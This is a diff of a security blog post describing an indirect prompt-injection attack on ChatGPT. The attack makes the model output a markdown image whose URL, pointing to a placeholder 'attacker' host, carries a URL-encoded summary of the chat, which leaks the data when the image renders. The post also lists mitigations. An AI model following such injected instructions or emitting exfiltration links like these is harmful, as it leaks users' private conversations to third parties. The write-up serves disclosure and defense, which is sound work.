@@ -152,7 +152,7 @@
 <p>Basically, if the LLM returns a markdown image in the form of</p>
 <pre tabindex="0"><code>![data exfiltration in progress](https://attacker/q=*exfil_data*)
 </code></pre><p>ChatGPT will render it automatically and retrieve the URL. During an Indirect Prompt Injection the adversary controls what the LLM is doing (I call it AI Injection for a reason), and it can ask to summarize the past history of the chat and append it to the URL to exfiltrate the data.</p>
-<p>I&rsquo;m not the only one who points this out, <a href="https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2">Roman Samoilenko has observed and posted about this vulnerability in ChatGPT before</a>. Roman found it March 14th. I ran across it separatley but a few weeks after.</p>
+<p>I&rsquo;m not the only one who points this out, <a href="https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2">Roman Samoilenko has observed and posted about this vulnerability in ChatGPT before</a>. Roman found it March 14th. I ran across it separatley a few weeks after.</p>
 <h3 id="proof-of-concept-demonstration">Proof of Concept Demonstration</h3>
 <p>This is possible with plugins, e.g. via the <code>WebPilot Plugin</code> or check out the <a href="/blog/posts/2023/chatgpt-plugin-youtube-indirect-prompt-injection/">YouTube Transcript Plugin Injection</a> I posted about the other day.</p>
 <p>The LLM&rsquo;s response can contain markdown (or instruct the AI to build it on the fly), summarize the past conversation, URL encode that summary and append that as query parameter. And off it goes to the attacker.</p>
@@ -181,7 +181,7 @@
 <li>In fact the idea of having some sort of <strong>kernel LLM</strong> and other sandbox LLM is discussed by <a href="https://simonwillison.net/2023/Apr/25/dual-llm-pattern/">Simon Willison, who has thought about this already in a lot more detail</a>.</li>
 <li>NVIDIA has been working on <a href="https://blogs.nvidia.com/blog/2023/04/25/ai-chatbot-guardrails-nemo/">NeMo GuardRails</a> to help keep bots in check</li>
 <li>Scenarios like rendering images could be implemented as a dedicated feature, rather than depending on the convenience of markdown. (e.g. links being returned that are not injected into the chat context, but as references after the main message).</li>
-<li>Only point Plugins to data you fully trust.</li>
+<li>Only use and point plugins to data you fully trust.</li>
 </ul>
 <p>A lot more research is needed, both from offensive and defensive side. And at this point, with the speed of adoption and new tools being released it seems that raising awareness to have more smart people look into this (and how to fix it) is the best we can do.</p>
 <h2 id="conclusion">Conclusion</h2>
